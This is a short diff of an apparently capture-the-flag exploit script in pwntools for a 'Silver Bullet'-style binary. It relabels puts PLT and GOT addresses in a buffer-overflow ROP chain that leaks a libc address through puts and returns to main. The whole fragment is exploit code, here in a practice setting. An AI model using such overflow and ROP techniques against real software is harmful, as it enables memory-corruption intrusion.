@@ -19,13 +19,13 @@ def beat():
     p.sendlineafter('Your choice :', '3')
 
 
-puts_got = 0x80484a8
-puts_reloc = 0x804afdc
+puts_plt = 0x80484a8
+puts_got = 0x804afdc
 main_func = 0x8048954
 
 createbullet('A' * 47)
 powerup('B' * 1)
-powerup(p32(0x7FFFFFFF) + 'OVE' + p32(puts_got) + p32(main_func) + p32(puts_reloc))
+powerup(p32(0x7FFFFFFF) + 'OVE' + p32(puts_plt) + p32(main_func) + p32(puts_got))
 beat();
 
 p.recvuntil('Oh ! You win !!\n')
